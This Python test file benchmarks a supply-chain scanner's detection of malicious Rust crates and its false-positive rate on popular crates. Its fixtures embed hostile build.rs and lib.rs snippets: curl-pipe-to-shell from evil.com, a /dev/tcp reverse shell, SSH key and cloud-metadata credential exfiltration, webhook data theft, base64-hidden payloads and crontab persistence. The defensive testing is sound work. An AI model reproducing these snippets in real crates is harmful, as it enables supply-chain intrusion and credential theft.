"""Cargo/Rust crate detection benchmark.

Tests Guard Proxy's detection rate against 8+ Cargo-specific supply chain
attack patterns based on real incidents and known attack vectors.
Goal: 90%+ detection rate.

Also tests false positive rate against 10+ popular Rust crates.
"""

import shutil
import tempfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from app.core.config import Settings
from app.decision.engine import DecisionEngine
from app.scanners.base import ScanPipeline
from app.scanners.cooldown import CooldownScanner
from app.scanners.heuristics_scanner import HeuristicsScanner
from app.scanners.ioc_checker import IOCScanner
from app.scanners.metadata_scanner import MetadataScanner
from app.scanners.static_analysis_cargo import CargoStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _settings():
    return Settings(decision_mode="enforce", cooldown_days=7, cooldown_action="deny")


def _cargo_scanners(s):
    return [
        IOCScanner(),
        CooldownScanner(s),
        MetadataScanner(),
        CargoStaticAnalysisScanner(s),
        HeuristicsScanner(),
    ]


async def _is_blocked(files, age_hours=24, name="evil-crate"):
    s = _settings()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    artifacts = []
    for fname, content in files.items():
        p = tmp / fname
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
        artifacts.append(p)
    pkg = PackageInfo(
        name=name,
        version="0.1.0",
        registry="cargo",
        publish_date=datetime.now(UTC) - timedelta(hours=age_hours),
    )
    results = await ScanPipeline(_cargo_scanners(s)).run(pkg, artifacts)
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    return decision.verdict in ("deny", "quarantine")


# ===== Malicious Detection (8 patterns) =====


async def test_cargo_01_build_rs_command_exec():
    """build.rs with Command::new("sh") -- runs at compile time."""
    assert await _is_blocked(
        {
            "build.rs": """use std::process::Command;

fn main() {
    Command::new("sh")
        .arg("-c")
        .arg("curl http://evil.com/payload | sh")
        .status()
        .unwrap();
}
""",
        }
    )


async def test_cargo_02_command_new_exec():
    """Command::new in lib.rs executing shell commands."""
    assert await _is_blocked(
        {
            "src/lib.rs": """use std::process::Command;

pub fn setup() {
    Command::new("bash")
        .arg("-c")
        .arg("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        .spawn()
        .unwrap();
}
""",
        }
    )


async def test_cargo_03_libc_system():
    """libc::system() call for arbitrary command execution."""
    assert await _is_blocked(
        {
            "src/lib.rs": """extern crate libc;
use std::ffi::CString;

pub fn init() {
    unsafe {
        let cmd = CString::new("curl http://evil.com/payload | sh").unwrap();
        libc::system(cmd.as_ptr());
    }
}
""",
        }
    )


async def test_cargo_04_webhook_exfiltration():
    """Data exfiltration via Discord webhook."""
    assert await _is_blocked(
        {
            "src/lib.rs": """use std::process::Command;

pub fn exfil() {
    let env_data = std::env::vars()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("\\n");
    let url = "https://discord.com/api/webhooks/123456/abcdef";
    Command::new("curl")
        .args(&["-X", "POST", "-d", &env_data, url])
        .status()
        .ok();
}
""",
        }
    )


async def test_cargo_05_ssh_key_access():
    """SSH key theft via file read."""
    assert await _is_blocked(
        {
            "src/lib.rs": """use std::fs;

pub fn steal() {
    let home = std::env::var("HOME").unwrap();
    let key = fs::read_to_string(format!("{}/.ssh/id_rsa", home)).unwrap();
    // exfiltrate key...
    std::process::Command::new("curl")
        .args(&["-d", &key, "http://10.0.0.1:8080/collect"])
        .status()
        .ok();
}
""",
        }
    )


async def test_cargo_06_cloud_metadata():
    """AWS/GCP metadata endpoint access for credential theft."""
    assert await _is_blocked(
        {
            "src/lib.rs": """pub fn steal_creds() {
    let resp = reqwest::blocking::get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        .unwrap()
        .text()
        .unwrap();
    std::process::Command::new("curl")
        .args(&["-d", &resp, "http://10.0.0.1:9090/creds"])
        .status()
        .ok();
}
""",
        }
    )


async def test_cargo_07_base64_decode_exec():
    """Base64 decode followed by command execution."""
    assert await _is_blocked(
        {
            "src/lib.rs": """use std::process::Command;

pub fn run() {
    let encoded = "Y3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3Iuc2ggfCBiYXNo";
    let decoded = base64::decode(encoded).unwrap();
    let cmd_str = String::from_utf8(decoded).unwrap();
    Command::new("sh")
        .arg("-c")
        .arg(&cmd_str)
        .status()
        .unwrap();
}
""",
        }
    )


async def test_cargo_08_crontab_persistence():
    """Crontab persistence mechanism."""
    assert await _is_blocked(
        {
            "build.rs": """use std::process::Command;

fn main() {
    Command::new("bash")
        .arg("-c")
        .arg(r#"(crontab -l 2>/dev/null; echo "*/5 * * * * curl http://evil.com/beacon") | crontab -"#)
        .status()
        .ok();
}
""",
        }
    )


# ===== False Positive Tests (popular Rust crates) =====


_POPULAR_CARGO_CRATES = [
    "serde",
    "tokio",
    "rand",
    "clap",
    "hyper",
    "actix-web",
    "reqwest",
    "tracing",
    "anyhow",
    "thiserror",
]


@pytest.mark.parametrize("crate_name", _POPULAR_CARGO_CRATES)
async def test_cargo_false_positive(crate_name):
    """Popular Cargo crates should NOT be flagged as malicious."""
    s = _settings()
    engine = DecisionEngine(s)
    pkg = PackageInfo(
        name=crate_name,
        version="1.0.0",
        registry="cargo",
        publish_date=datetime.now(UTC) - timedelta(days=365),
    )
    # Simulate clean crate -- no artifacts to scan (metadata-only check)
    scanners = [IOCScanner(), CooldownScanner(s), MetadataScanner()]
    results = await ScanPipeline(scanners).run(pkg, [])
    decision = engine.decide(results)
    assert decision.verdict == "allow", f"{crate_name} was incorrectly flagged as {decision.verdict}"


async def test_cargo_fp_cc_build():
    """cc::Build in build.rs is a legitimate build tool, not malicious."""
    s = _settings()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    p = tmp / "build.rs"
    p.write_text("""// Generated by build system
fn main() {
    cc::Build::new()
        .file("src/foo.c")
        .compile("foo");
}
""")
    pkg = PackageInfo(
        name="safe-native-crate",
        version="1.0.0",
        registry="cargo",
        publish_date=datetime.now(UTC) - timedelta(days=365),
    )
    results = await ScanPipeline(_cargo_scanners(s)).run(pkg, [p])
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    assert decision.verdict == "allow", f"cc::Build was incorrectly flagged as {decision.verdict}"


async def test_cargo_fp_pkg_config():
    """pkg_config usage in build.rs is legitimate."""
    s = _settings()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    p = tmp / "build.rs"
    p.write_text("""fn main() {
    pkg_config::Config::new()
        .atleast_version("1.0")
        .probe("openssl")
        .unwrap();
}
""")
    pkg = PackageInfo(
        name="openssl-sys",
        version="0.9.0",
        registry="cargo",
        publish_date=datetime.now(UTC) - timedelta(days=365),
    )
    results = await ScanPipeline(_cargo_scanners(s)).run(pkg, [p])
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    assert decision.verdict == "allow", f"pkg_config was incorrectly flagged as {decision.verdict}"


async def test_cargo_fp_bindgen():
    """bindgen usage in build.rs is legitimate."""
    s = _settings()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    p = tmp / "build.rs"
    p.write_text("""fn main() {
    let bindings = bindgen::Builder::default()
        .header("wrapper.h")
        .generate()
        .expect("Unable to generate bindings");
    bindings.write_to_file("bindings.rs").unwrap();
}
""")
    pkg = PackageInfo(
        name="libfoo-sys",
        version="0.1.0",
        registry="cargo",
        publish_date=datetime.now(UTC) - timedelta(days=365),
    )
    results = await ScanPipeline(_cargo_scanners(s)).run(pkg, [p])
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    assert decision.verdict == "allow", f"bindgen was incorrectly flagged as {decision.verdict}"


async def test_cargo_fp_serde_derive():
    """serde derive macros are legitimate."""
    s = _settings()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    p = tmp / "src" / "lib.rs"
    p.parent.mkdir(parents=True)
    p.write_text("""use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize)]
pub struct Config {
    pub name: String,
    pub version: String,
}
""")
    pkg = PackageInfo(
        name="my-config",
        version="1.0.0",
        registry="cargo",
        publish_date=datetime.now(UTC) - timedelta(days=365),
    )
    results = await ScanPipeline(_cargo_scanners(s)).run(pkg, [p])
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    assert decision.verdict == "allow", f"serde derive was incorrectly flagged as {decision.verdict}"


async def test_cargo_fp_tokio_async():
    """tokio async runtime code is legitimate."""
    s = _settings()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    p = tmp / "src" / "main.rs"
    p.parent.mkdir(parents=True)
    p.write_text("""#[tokio::main]
async fn main() {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:8080").await.unwrap();
    loop {
        let (socket, _) = listener.accept().await.unwrap();
        tokio::spawn(async move {
            // handle connection
        });
    }
}
""")
    pkg = PackageInfo(
        name="my-server",
        version="1.0.0",
        registry="cargo",
        publish_date=datetime.now(UTC) - timedelta(days=365),
    )
    results = await ScanPipeline(_cargo_scanners(s)).run(pkg, [p])
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    assert decision.verdict == "allow", f"tokio async was incorrectly flagged as {decision.verdict}"


# ===== Summary =====


async def test_cargo_benchmark_summary():
    """Run all Cargo detection tests and report results."""
    results = {}
    tests = [
        ("cargo_01_build_rs_command", test_cargo_01_build_rs_command_exec),
        ("cargo_02_command_new", test_cargo_02_command_new_exec),
        ("cargo_03_libc_system", test_cargo_03_libc_system),
        ("cargo_04_webhook", test_cargo_04_webhook_exfiltration),
        ("cargo_05_ssh_key", test_cargo_05_ssh_key_access),
        ("cargo_06_cloud_metadata", test_cargo_06_cloud_metadata),
        ("cargo_07_base64_exec", test_cargo_07_base64_decode_exec),
        ("cargo_08_crontab", test_cargo_08_crontab_persistence),
    ]

    detected = 0
    for name, test_fn in tests:
        try:
            await test_fn()
            results[name] = "DETECTED"
            detected += 1
        except AssertionError:
            results[name] = "MISSED"

    rate = detected / len(tests) * 100
    print(f"\n{'=' * 60}")
    print(f"Cargo Detection Benchmark: {detected}/{len(tests)} ({rate:.0f}%)")
    print(f"{'=' * 60}")
    for name, status in results.items():
        icon = "+" if status == "DETECTED" else "-"
        print(f"  [{icon}] {name}: {status}")
    print(f"{'=' * 60}")

    assert rate >= 90, f"Cargo detection rate {rate:.0f}% is below 90% target"
